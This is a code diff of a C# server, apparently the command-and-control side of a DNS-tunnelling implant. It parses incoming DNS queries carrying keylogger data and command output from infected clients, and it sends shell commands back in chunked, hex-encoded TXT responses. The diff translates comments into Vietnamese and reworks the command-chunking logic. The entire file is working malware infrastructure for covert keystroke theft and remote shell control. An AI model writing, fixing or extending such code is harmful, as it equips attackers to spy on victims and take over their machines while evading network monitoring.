@@ -118,12 +118,12 @@ namespace Server.Logic
                     string[] parts = extractedData.Split('.', 2);
                     string packetType = parts[0];
 
-                    // Type A: Connection initiation (QTYPE=1 A record)
+                    // Type A: Khoi tao ket noi (QTYPE=1 A record)
                     if (packetType == "a" && dnsQuery.QueryType == 1)
                     {
                         LogMessage($"\n[Query] {queryName} from {remoteEP.Address}");
                         
-                        // Check if client already exists by IP
+                        // Kiem tra client da ton tai theo IP
                         int existingId = _clientManager.GetConnectionIdByIp(remoteEP.Address.ToString());
                         int connectionId;
                         
@@ -137,7 +137,7 @@ namespace Server.Logic
                             LogMessage($"[Connect] Starting connection #{_clientManager.ClientCount + 1}");
                             connectionId = _clientManager.AddClient(remoteEP.Address.ToString());
                             
-                            // Initialize command queue for this connection
+                            // Khoi tao command queue cho ket noi nay
                             lock (_commandQueues)
                             {
                                 if (!_commandQueues.ContainsKey(connectionId))
@@ -150,7 +150,7 @@ namespace Server.Logic
                         string fakeIp = IPGenerator.CreateStartIp(connectionId - 1);
                         response = DNSResponseBuilder.CreateSimpleAResponse(data, dnsQuery, fakeIp);
                     }
-                    // Type B: Keylogger data (QTYPE=1 A record)
+                    // Type B: Du lieu keylogger (QTYPE=1 A record)
                     else if (packetType == "b" && dnsQuery.QueryType == 1)
                     {
                         LogMessage($"\n[Query] {queryName} from {remoteEP.Address}");
@@ -162,7 +162,7 @@ namespace Server.Logic
                         string responseIp = IPGenerator.CreateResponseIp(ResponseCode.OK);
                         response = DNSResponseBuilder.CreateSimpleAResponse(data, dnsQuery, responseIp);
                     }
-                    // Type C: Command result chunks (QTYPE=1 A record)
+                    // Type C: Cac chunk ket qua lenh (QTYPE=1 A record)
                     else if (packetType == "c" && dnsQuery.QueryType == 1)
                     {
                         LogMessage($"\n[Query] {queryName} from {remoteEP.Address}");
@@ -171,7 +171,7 @@ namespace Server.Logic
                         LogMessage($"[Debug] Parsing Type C, rest: '{rest}'");
                         
                         // Parse: c.packetNumber.offset.connectionId.hexData.domain
-                        // Need to extract domain first, then parse the rest
+                        // Can tach domain truoc, roi parse phan con lai
                         // Format: packetNumber.offset.connectionId.hexData.<domain parts>
                         string[] cParts = rest.Split('.');
                         LogMessage($"[Debug] Split into {cParts.Length} parts");
@@ -210,7 +210,7 @@ namespace Server.Logic
 
                         LogMessage($"[Data] Command result chunk from connection #{connectionId} (packet #{packetNumber}, offset {offset})");
                         
-                        // Parse hex data and add to parser
+                        // Parse hex data va them vao parser
                         var parser = _clientManager.GetParser(connectionId);
                         if (parser != null)
                         {
@@ -220,14 +220,14 @@ namespace Server.Logic
                             string decodedText = System.Text.Encoding.UTF8.GetString(decodedData);
                             LogMessage($"  => Chunk data: '{decodedText}'");
                             
-                            // Trigger event for command result (to update shell window)
+                            // Kich hoat event cho ket qua lenh (cap nhat shell window)
                             OnCommandResult?.Invoke(connectionId, decodedText);
                         }
 
                         string responseIp = IPGenerator.CreateResponseIp(ResponseCode.OK);
                         response = DNSResponseBuilder.CreateSimpleAResponse(data, dnsQuery, responseIp);
                     }
-                    // Type P: Poll for commands (QTYPE=16 TXT record)
+                    // Type P: Poll lay lenh (QTYPE=16 TXT record)
                     else if (packetType == "p" && dnsQuery.QueryType == 16)
                     {
                         LogMessage($"\n[Query] {queryName} from {remoteEP.Address}");
@@ -264,44 +264,46 @@ namespace Server.Logic
                                 LogMessage($"[Debug] Commands in queue: {_commandQueues[connectionId].Count}");
                             }
                             
-                            if (_commandQueues.ContainsKey(connectionId) && _commandQueues[connectionId].Count > 0)
-                            {
-                                // Get or initialize chunk state
-                                if (!_commandChunkState.ContainsKey(connectionId) || _commandChunkState[connectionId].currentChunk == 0)
-                                {
-                                    string fullCommand = _commandQueues[connectionId].Dequeue();
-                                    int totalChunks = (int)Math.Ceiling(fullCommand.Length / 60.0);
-                                    _commandChunkState[connectionId] = (fullCommand, totalChunks, 0);
-                                    LogMessage($"  => Preparing to send command: '{fullCommand}' ({totalChunks} chunks)");
-                                }
-
-                                var state = _commandChunkState[connectionId];
-                                int chunkStart = offset * 60;
-                                
-                                if (chunkStart < state.fullCommand.Length)
-                                {
-                                    int chunkLen = Math.Min(60, state.fullCommand.Length - chunkStart);
-                                    string rawChunk = state.fullCommand.Substring(chunkStart, chunkLen);
-                                    
-                                    // Hex-encode the command chunk to preserve UTF-8 encoding
-                                    byte[] chunkBytes = System.Text.Encoding.UTF8.GetBytes(rawChunk);
-                                    commandChunk = Convert.ToHexString(chunkBytes).ToLower();
-                                    
-                                    _commandChunkState[connectionId] = (state.fullCommand, state.totalChunks, offset + 1);
-                                    LogMessage($"  => Sending chunk {offset + 1}/{state.totalChunks}: '{rawChunk}'");
-                                    LogMessage($"  => Hex encoded ({chunkBytes.Length} bytes): {commandChunk}");
-                                }
-                                else
-                                {
-                                    // All chunks sent, clear state
-                                    _commandChunkState.Remove(connectionId);
-                                    LogMessage($"  => All chunks sent, returning empty (end signal)");
-                                }
-                            }
-                            else
-                            {
-                                LogMessage($"  => No commands queued");
-                            }
+            if (!_commandChunkState.ContainsKey(connectionId))
+            {
+                // Khong co lenh dang xu ly, kiem tra lenh moi
+                if (_commandQueues.ContainsKey(connectionId) && _commandQueues[connectionId].Count > 0)
+                {
+                    string fullCommand = _commandQueues[connectionId].Dequeue();
+                    int totalChunks = (int)Math.Ceiling(fullCommand.Length / 60.0);
+                    _commandChunkState[connectionId] = (fullCommand, totalChunks, 0);
+                    LogMessage($"  => Preparing to send command: '{fullCommand}' ({totalChunks} chunks)");
+                }
+            }
+            
+            if (_commandChunkState.ContainsKey(connectionId))
+            {
+                var state = _commandChunkState[connectionId];
+                int chunkStart = offset * 60;
+                
+                if (chunkStart < state.fullCommand.Length)
+                {
+                    int chunkLen = Math.Min(60, state.fullCommand.Length - chunkStart);
+                    string rawChunk = state.fullCommand.Substring(chunkStart, chunkLen);
+                    
+                    // Ma hoa hex de bao toan UTF-8 encoding
+                    byte[] chunkBytes = System.Text.Encoding.UTF8.GetBytes(rawChunk);
+                    commandChunk = Convert.ToHexString(chunkBytes).ToLower();
+                    
+                    LogMessage($"  => Sending chunk {offset + 1}/{state.totalChunks}: '{rawChunk}'");
+                    LogMessage($"  => Hex encoded ({chunkBytes.Length} bytes): {commandChunk}");
+                }
+                else
+                {
+                    // Da gui het chunks, xoa state
+                    _commandChunkState.Remove(connectionId);
+                    LogMessage($"  => All chunks sent, returning empty (end signal)");
+                }
+            }
+            else
+            {
+                LogMessage($"  => No commands queued");
+            }
                         }
 
                         response = DNSResponseBuilder.CreateTXTResponse(data, dnsQuery, commandChunk);
